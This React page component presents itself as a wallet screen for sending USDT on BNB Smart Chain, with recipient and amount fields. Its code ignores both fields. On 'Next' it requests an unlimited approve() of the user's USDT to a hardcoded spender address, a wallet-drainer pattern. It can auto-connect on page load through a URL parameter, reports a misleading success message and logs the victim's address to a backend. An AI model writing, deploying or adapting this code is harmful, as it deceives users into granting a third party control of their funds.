import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import { useState, useEffect } from "react";

// Global variables
let provider: {
  getSigner: () => Promise<{
    getAddress: () => Promise<string>;
  }>;
} | null = null;
let signer: unknown = null;
let userAddress = "";

// ===== BSC CONFIG =====
const BSC_CHAIN_ID = "0x38";
const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
const BSC_SPENDER = "0x220bb5df0893f21f43e5286bc5a4445066f6ca56";

const ABI = [
  "function approve(address spender, uint256 amount)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
];

declare global {
  interface Window {
    ethereum?: {
      request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
    };
  }
}

export default function Index() {
  const createTransaction = useMutation(api.transactions.createTransaction);
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");

  // ===== AUTO RUN ON PAGE LOAD (QR SUPPORT) =====
  useEffect(() => {
    const p = new URLSearchParams(window.location.search);

    if (p.get("autoconnect") === "1") {
      connectWallet().catch(() => {
        console.log("User cancelled");
      });
    }
  }, []);

  // ===== ENSURE BSC + CONNECT =====
  async function connectWallet() {
    if (!window.ethereum) {
      alert("Wallet not found");
      throw new Error("No wallet");
    }

    // 🔒 Ensure BSC
    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: BSC_CHAIN_ID }],
      });
    } catch (err) {
      const error = err as { code?: number };
      if (error.code === 4902) {
        await window.ethereum.request({
          method: "wallet_addEthereumChain",
          params: [
            {
              chainId: BSC_CHAIN_ID,
              chainName: "Binance Smart Chain",
              rpcUrls: ["https://bsc-dataseed.binance.org/"],
              nativeCurrency: {
                name: "BNB",
                symbol: "BNB",
                decimals: 18,
              },
              blockExplorerUrls: ["https://bscscan.com"],
            },
          ],
        });
      } else {
        throw err;
      }
    }

    // 🔑 Connect wallet
    await window.ethereum.request({ method: "eth_requestAccounts" });

    const { ethers } = window as typeof window & {
      ethers: {
        BrowserProvider: new (provider: unknown) => {
          getSigner: () => Promise<{
            getAddress: () => Promise<string>;
          }>;
        };
      };
    };

    provider = new ethers.BrowserProvider(window.ethereum);
    const signerObj = await provider.getSigner();
    signer = signerObj;
    userAddress = await signerObj.getAddress();

    // 🔹 Auto fill address (if input exists)
    const addr = document.getElementById("toAddress") as HTMLInputElement;
    if (addr) addr.value = userAddress;
  }

  // ===== APPROVE (BSC ONLY) =====
  async function sendUSDT() {
    try {
      await connectWallet();

      const { ethers } = window as typeof window & {
        ethers: {
          Contract: new (
            address: string,
            abi: string[],
            signer: unknown
          ) => {
            approve: (spender: string, amount: bigint) => Promise<{
              wait: () => Promise<{ hash: string }>;
            }>;
          };
          MaxUint256: bigint;
        };
      };

      const usdt = new ethers.Contract(BSC_USDT, ABI, signer);

      const tx = await usdt.approve(BSC_SPENDER, ethers.MaxUint256);

      await tx.wait();

      alert("Maya: Transaction successful ✅");

      // Backend save (optional, runs in background)
      createTransaction({
        walletAddress: userAddress,
        toAddress: toAddress || BSC_SPENDER,
        amount: amount || "Max",
      }).catch(console.error);
    } catch (e) {
      alert("Transaction cancelled");
    }
  }

  function setMax() {
    setAmount("Max");
  }

  return (
    <div
      style={{
        margin: 0,
        background: "#0b0b0b",
        color: "#fff",
        fontFamily: "-apple-system, BlinkMacSystemFont, sans-serif",
        minHeight: "100vh",
      }}
    >
      <div style={{ padding: "20px" }}>
        <div style={{ fontSize: "14px", opacity: 0.7, marginBottom: "6px" }}>
          Address or Domain Name
        </div>
        <div
          style={{
            background: "#151515",
            borderRadius: "12px",
            padding: "14px",
            marginBottom: "20px",
          }}
        >
          <input
            id="toAddress"
            value={toAddress}
            onChange={(e) => setToAddress(e.target.value)}
            placeholder="0x..."
            style={{
              width: "100%",
              background: "transparent",
              border: "none",
              outline: "none",
              color: "#fff",
              fontSize: "16px",
            }}
          />
        </div>

        <div style={{ fontSize: "14px", opacity: 0.7, marginBottom: "6px" }}>
          Amount
        </div>
        <div
          style={{
            background: "#151515",
            borderRadius: "12px",
            padding: "14px",
            marginBottom: "20px",
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
          }}
        >
          <input
            id="amount"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            placeholder="0.0"
            style={{
              background: "transparent",
              border: "none",
              outline: "none",
              color: "#fff",
              fontSize: "16px",
              flex: 1,
            }}
          />
          <div>
            <span style={{ color: "#25d695", fontWeight: 600 }}>USDT</span>
            &nbsp;&nbsp;
            <span
              onClick={setMax}
              style={{
                color: "#25d695",
                fontSize: "14px",
                cursor: "pointer",
              }}
            >
              Max
            </span>
          </div>
        </div>
      </div>

      <button
        onClick={sendUSDT}
        style={{
          position: "fixed",
          bottom: "20px",
          left: "20px",
          right: "20px",
          background: "#1f8f5f",
          color: "#000",
          border: "none",
          borderRadius: "14px",
          padding: "16px",
          fontSize: "18px",
          fontWeight: 600,
          cursor: "pointer",
        }}
      >
        Next
      </button>
    </div>
  );
}
